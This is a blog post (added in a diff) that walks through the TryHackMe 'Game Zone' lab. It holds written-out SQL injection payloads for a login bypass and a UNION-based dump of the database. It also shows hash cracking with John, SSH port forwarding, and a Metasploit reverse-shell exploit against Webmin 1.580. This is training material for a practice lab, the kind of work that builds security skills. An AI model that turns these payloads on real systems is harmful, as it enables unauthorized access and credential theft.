@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Game Zone - Linux :: 5ysk3y Pwnz — An online resource for Hack the Box stuff</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Overview Today I&amp;rsquo;ll be bringing you a guide for the Try Hack Me room, Gamezone. This is an invaluable room for anyone looking to familiarize themselves with OSCP level concepts as the first stage leverages an ORDER BY/UNION SQL injection. During this walkthrough we&amp;rsquo;re going to manually exploit the injection, instead of relying on SQLMap to do it for us, in order to get a password. From there we use SSH Port Forwarding to gain access to a Webmin service that&amp;rsquo;s locked down, before we use metasploit to compromise that." />
+<meta name="keywords" content="HTB, Hack the Box" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://5ysk3y.github.io/thm/guides/gamezone/" />
+
+
+
+
+<link rel="stylesheet" href="https://5ysk3y.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://5ysk3y.github.io/assets/blue.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://5ysk3y.github.io/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://5ysk3y.github.io/img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  <meta name="twitter:site" content="" />
+
+<meta name="twitter:creator" content="" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Game Zone - Linux :: 5ysk3y Pwnz">
+<meta property="og:description" content="Overview Today I&amp;rsquo;ll be bringing you a guide for the Try Hack Me room, Gamezone. This is an invaluable room for anyone looking to familiarize themselves with OSCP level concepts as the first stage leverages an ORDER BY/UNION SQL injection. During this walkthrough we&amp;rsquo;re going to manually exploit the injection, instead of relying on SQLMap to do it for us, in order to get a password. From there we use SSH Port Forwarding to gain access to a Webmin service that&amp;rsquo;s locked down, before we use metasploit to compromise that." />
+<meta property="og:url" content="https://5ysk3y.github.io/thm/guides/gamezone/" />
+<meta property="og:site_name" content="Game Zone - Linux" />
+<meta property="og:image" content="https://5ysk3y.github.io/">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2020-05-12 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    5ysk3y pwnZ
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/">Home</a></li>
+        
+      
+        
+          <li><a href="/htb">HTB</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/thm">THM</a></li>
+              
+            
+              
+                <li><a href="https://gist.github.com/5ysk3y">Gists</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/">Home</a></li>
+      
+    
+      
+        <li><a href="/htb">HTB</a></li>
+      
+    
+      
+        <li><a href="/thm">THM</a></li>
+      
+    
+      
+        <li><a href="https://gist.github.com/5ysk3y">Gists</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://5ysk3y.github.io/thm/guides/gamezone/">Game Zone - Linux</a></h1>
+  <div class="post-meta">
+      
+    <span class="post-date">
+      2020-05-12
+    </span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://5ysk3y.github.io/tags/oscp/">OSCP</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/sqli/">SQLi</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/metasploit/">Metasploit</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/port-forwarding/">Port Forwarding</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/linux/">Linux</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  <div class="post-content"><div>
+        
+  <figure class="left" >
+    <img src="/images/guides/thm/gamezone.png"   />
+    
+  </figure>
+
+
+<h2 id="overview"><strong>Overview</strong><a href="#overview" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Today I&rsquo;ll be bringing you a guide for the Try Hack Me room, Gamezone. This is an invaluable room for anyone looking to familiarize themselves with OSCP level concepts as the first stage leverages an ORDER BY/UNION SQL injection. During this walkthrough we&rsquo;re going to manually exploit the injection, instead of relying on SQLMap to do it for us, in order to get a password. From there we use SSH Port Forwarding to gain access to a Webmin service that&rsquo;s locked down, before we use metasploit to compromise that. This was a really fun room so, let&rsquo;s go!</p>
+<hr>
+<h2 id="nmap-scan"><strong>NMAP Scan</strong><a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>As is standard, we start off our process with an nmap scan to determine what ports we can listen on:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.80 scan initiated Sun Apr 26 04:38:10 2020 as: nmap -Pn -sC -sV -oA initial -v 10.10.250.216</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.250.216
+Host is up <span style="color:#f92672">(</span>0.032s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">998</span> closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey:
+|   <span style="color:#ae81ff">2048</span> 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Game Zone
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Sun Apr 26 04:38:24 2020 -- 1 IP address (1 host up) scanned in 14.22 seconds</span>
+</code></pre></div><h2 id="walkthrough">Walkthrough<a href="#walkthrough" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>As we can see, there&rsquo;s 2 ports Open:</p>
+<ul>
+<li>SSH (7.2p2)</li>
+<li>Apache (2.4.18)</li>
+</ul>
+<p>The main site on port 80 has no associated CMS - it looks bloody old. There&rsquo;s a login form on the left side thats exploitable via cassic SQL injection, a la <code>admin' OR 1=1 -- -</code></p>
+<p>This simple injection allows us to bypass the main login, however once we get to the &ldquo;admin panel&rdquo; there&rsquo;s another SQL injectable form in the guise of a search field - passing this to burpsuite, we can start to enumerate number of columns in the table that&rsquo;s being queried by default; we do this by using  <code>ORDER BY</code>  and we continue to increment its value until we get an error. The following query was the last I submit <em>before</em> I recieved an error indicating that, in this case, the target table has 3 colums:</p>
+<p><code>searchitem=test' ORDER BY 3-- -</code></p>
+<p>Now we have this information we can then use <code>union</code> to confirm we can inject information onto the page:</p>
+<p><code>searchitem=test' UNION SELECT 1,2,3-- -</code></p>
+<p>This produces &ldquo;1,2,3&rdquo; on the page and we can hijack one of these and replace it with a nested SQL statement or, to test, a string:</p>
+<p><code>searchitem=test' UNION SELECT 1,&quot;5ysk3y&quot;,3-- -</code></p>
+<p>This renders the word <code>5ysk3y</code> on the page in place of the second colmn - if we replace that second value with a mySQL function instead, like <code>user()</code>, we get <code>root@localhost</code> printed on the page. So we can now start to enumerate stuff as we can get the page to output it.</p>
+<p>As the room asks us to use SQLMap, I&rsquo;ll set that off while I manually exploit this in tandem. The SQLMap command I used is:</p>
+<p><code>sqlmap -r $(pwd)/search.req --technique=U --batch</code></p>
+<blockquote>
+<p>N.B. As we know its UNION injectable, specifying <code>U</code> as the technique allows us to target that specifically.</p>
+</blockquote>
+<p>To manually exploit this we can reference the <code>INFORMATION SCHEMA</code> database in MySQL - this contains stuff that MySQL itself uses to keep things in order, e.g. other database names as well as tonnes of related data - the <code>SCHEMATA</code> table specifically contains the names of databases MySQL knows about. The following query would extract those:</p>
+<p><code>searchitem=test' UNION SELECT 1,(select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),3-- -</code></p>
+<p>As mentioned, to run another query as part of the union it needs to be <code>(nested)</code> and, in order to view everything that matches our query (as there&rsquo;s more than one value returned in the output) we wrap the target table in the group_concat() function. This gets us the following output on the page in place of the second column:</p>
+<p><code>information_schema, db, mysql, performance_schema, sys</code></p>
+<p>The schema/sys/mysql databases belong to MySQL, the <code>db</code> database seems like it will contain data we may want.</p>
+<p><a href="https://dev.mysql.com/doc/refman/5.7/en/schemata-table.html" target="_blank">This</a>
+ is a particularly good reference for finding out what tables within INFORMATION_SCHEMA you can query to get information about other DB&rsquo;s to use for further queries/enumeration.</p>
+<p>As we now have a database to target we can query the names of the tables within that database:</p>
+<p><code>searchitem=test' UNION SELECT 1,(select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'db'),3-- -</code></p>
+<p>Which gives us the name of the two tables inside this database:</p>
+<p><code>Posts, Users</code></p>
+<p>From there we can start to enumerate the columns within those tables. In this case, I focused on the user table as it&rsquo;s the most interesting:</p>
+<p><code>searchitem=test' UNION SELECT 1,(select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'),3-- -</code></p>
+<p>This shows the following columns:</p>
+<p><code>username, pwd, USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS</code></p>
+<p>Which means we can now do some more useful queries, such as:</p>
+<p><code>searchitem=test' UNION SELECT 1,(select username from db.users),3-- -</code></p>
+<p>Which gets us a username:</p>
+<p><code>agent47</code></p>
+<p>And we can also query the password as well:</p>
+<p><code>searchitem=test' UNION SELECT 1,(select pwd from db.users),3-- -</code></p>
+<p>Which gets us a hash:</p>
+<p><code>ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14</code></p>
+<p>We could have also got this via SQLMap by including <code>--dump</code> in our earlier command, but that&rsquo;s less fun. Also, SQLMap did confirm our original suspicions that this was UNION injectable:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL">sqlmap resumed the following injection point(s) <span style="color:#66d9ef">from</span> stored <span style="color:#66d9ef">session</span>:
+<span style="color:#75715e">---
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">Parameter</span>: searchitem (POST)
+    <span style="color:#66d9ef">Type</span>: <span style="color:#66d9ef">UNION</span> query
+    Title: Generic <span style="color:#66d9ef">UNION</span> query (<span style="color:#66d9ef">NULL</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span> columns
+    Payload: searchitem<span style="color:#f92672">=</span>test<span style="color:#e6db74">&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7171,0x654a55516342637965547842506b644e7a43565354614c63756f4368676e70434165736969574c4a,0x7162716a71)-- -
+</span></code></pre></div><hr>
+<p>Next up; lets play crack the hash. Using John, we can handle this via our cracking rig..</p>
+<pre><code># john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt agent47.hash --fork=4`
+l# john --show --format=raw-SHA256 agent47.hash
+videogamer124
+</code></pre><p>Success! We get a password. Using the login combination of <code>agent47:videogamer124</code> we can now SSH into the machine.</p>
+<p>Once on the box, we would traditionally enumerate but this is a guided experience so lets stick with the beaten path; running <code>ss</code> to get a list of listening ports on the box, we see one that stands out due to its number as well as the fact that it didn&rsquo;t appear on our nmap scan:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">agent47@gamezone:~$ ss -tulpn
+Netid State      Recv-Q Send-Q           Local Address:Port                  Peer Address:Port
+udp   UNCONN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>                *:10000                             *:*
+udp   UNCONN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>                *:68                                *:*
+tcp   LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">8</span>                127.0.0.1:3306                      *:*
+tcp   LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>              *:10000                             *:*
+tcp   LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>              *:22                                *:*
+tcp   LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>              :::80                               :::*
+tcp   LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>              :::22                               :::*
+</code></pre></div><p>And this is a table to outline what the arguments denote:</p>
+<p><img src="../../../_resources/13aced50a14f4b4da376ec97110fb6d0.png" alt="ss_arguments"></p>
+<p>Port 22, 80 and 3306 we can rule out as we know what they are - port 10000, on the other hand, is a little unconventional.</p>
+<p>It doesn&rsquo;t show up on a full port scan so we can assume the firewall is blocking us. We can&rsquo;t quite confirm just yet but it seems likely:</p>
+<pre><code>agent47@gamezone:~$ cat /etc/iptables/rules.v4
+cat: /etc/iptables/rules.v4: Permission denied
+</code></pre><p>In order to look into this service, we need to use a <em>local</em> tunnel via SSH to forward the port from the remote box, back to us, so that it&rsquo;s accessible. In order to do this we can run the following command:</p>
+<pre><code># ssh -L 10000:127.0.0.1:10000 -f -N agent47@10.10.148.87
+agent47@10.10.148.87's password:
+</code></pre><p>The <code>-f</code> flag tells the connection to run in the background, and the <code>-N</code> flag is required with that to tell SSH that no command execution is required (as it is typically expected).</p>
+<p>Initially, to confirm what the port is for, I ran nmap against it:</p>
+<pre><code> # nmap -sC -sV -p 10000 -Pn 127.0.0.1
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-26 06:33 BST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00012s latency).
+
+PORT      STATE SERVICE VERSION
+10000/tcp open  http    MiniServ 1.580 (Webmin httpd)
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-server-header: MiniServ/1.580
+|_http-title: Login to Webmin
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 36.86 seconds
+</code></pre><p>And visiting it in a browser confirms that its a web accessible console named <code>webmin</code> - taking a wild guess via our SSH access to the box (since <code>locate</code> didn&rsquo;t find anything) I tried <code>/etc/webmin</code> and found most of the files for that service. The majority were unreadable and owned by root but one of them, a file named <code>version</code> was not:</p>
+<pre><code>agent47@gamezone:/etc/webmin$ cat version
+1.580
+</code></pre><p>If we run this through exploit DB, we will see that there&rsquo;s a metasploit module available to exploit this specific version of webmin:</p>
+<blockquote>
+<p>Webmin 1.580 - &lsquo;/file/show.cgi&rsquo; Remote Command Execution (Metasploit)</p>
+</blockquote>
+<p>If we load that up we can see that it&rsquo;s sending encoded payloads via an authenticated session. This leverages a vulnerability in the services show.cgi component allowing an attacker to run commands with root privilages. We first need credentials though - I initialy tried hydra against the form but got myself banned rather quickly, then I stopped being stupid and tried our existing creds for Agent47 and they do work.</p>
+<p>The correct metasploit module is <code>exploit/unix/webapp/webmin_show_cgi_exec</code></p>
+<p>If we send the module through our burp proxy by running:</p>
+<p><code>set PROXIES http:127.0.0.1:8080</code></p>
+<p>We can follow the chain of events for the most part - its a little more complicated as the payload, in this case, is another metasploit module thats encoded and uploaded via the FileManager functionality in Webmin. Effectively it uploads a file and then executes that via <code>sh</code> - the default payload is <code>cmd/unix/reverse_perl</code> and this basically consists of a Perl command that will intiiate a reverse shell. This gets dumped into a file thats named using a random set of characters/numbers and then called in the following manner:</p>
+<pre><code>GET /file/show.cgi/bin/UP8Qmwh|sh -c
+Host: 127.0.0.1:10000
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Cookie: sid=e6b8f4f5ff9b17ac77529c6e91c88667
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+</code></pre><p>Assuming the file exists and the payload is correct, it&rsquo;ll get executed. I may see if I can supply a manual payload at a later date, for now though Metasploit is the easiest way to handle this.</p>
+<p>This gets you  a shell, though, and as the root user non-the-less.</p>
+<hr>
+<h2 id="final-thoughts">Final Thoughts<a href="#final-thoughts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>All in all, this is a guided room so the difficulty curve will only go so far. In this case, we tried to take it a step further by manual exlpoitation of SQL. Wherever possible, and in line with expectations for the OSCP, I try and refrain from using SQLMap and Metasploit as much as possible. They are one-time/limited use tools in the OSCP exam so becoming reliant on them instead of your own knowledge isn&rsquo;t going to be favorable in the long term. Hopefully this better explains exactly how this is done, as well as detailing how SQLMap itself handle this. In the last stage, manual exploitation wasn&rsquo;t an easy thing to accomplish hence why I stuck with metasploit there. </p>
+<p>None-the-less, this is a great learning experience for anyone that hasn&rsquo;t manually exploited SQLi to this degree before. I hope you enjoyed the read.</p>
+
+      </div></div>
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://5ysk3y.github.io/assets/main.js"></script>
+<script src="https://5ysk3y.github.io/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
